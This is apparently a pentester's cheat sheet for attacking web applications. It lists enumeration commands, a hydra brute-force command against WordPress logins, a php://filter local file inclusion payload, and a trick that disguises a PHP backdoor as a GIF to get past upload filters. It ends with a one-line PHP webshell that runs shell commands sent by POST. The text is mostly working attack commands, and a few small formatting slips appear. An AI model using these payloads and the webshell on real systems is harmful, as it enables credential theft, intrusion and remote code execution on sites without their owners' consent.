Generic Webapp Starting Points
==============================

Identify & Enumerate
--------------------

### Identify interesting files on the webserver not linked from the root

URL lists:
- https://github.com/danielmiessler/SecLists/

```
gobuster -u http://$IP  -w /pentest/seclists/Discovery/Web_Content/raft-medium-files.txt -e -r -l
```

```
nikto -h $IP > nikto_results
```

Don't forget the obvious ones:
- robots.txt
- license.txt

### Wordpress Identification
```
wpscan --enumerate --threads 20 --batch --log --url http://$IP
```

### Wordpress Enum Users
After generating a users.txt and a pass.txt, give them all a try:
```
hydra -L users.txt -P pass.txt 192.168.100.181 http-form-post \
"/wp-login.php:log=^USER^&pwd=^PASS^:login_error""
```
Here, `login_error` is the string to find when the user/pass doesn't work.

```
wpscan --log --batch --url $IP  --wordlist ${PWD}/pass.txt --username admin --threads 20
```

Exploitation
------------

### Local File Inclusion

If you have
```
include($_GET['page'] . ".php");
```
You can reveal php contents with:

?page=php://filter/convert.base64-encode/resource=index
```
and some clever scripting

### Image Upload

1. Try just taking on an extension: `backdoor.php.gif`
2. Try prefixing the file with a small gif:
```
printf "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x00\xff\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x00\x3b" > backdoor.php.gif
cat backdoor.php >> backdoor.php.gif
```

Tools
-----
### Webshell:
Simple webshell:

```
<?php @system($_POST['cmd']); ?>
```
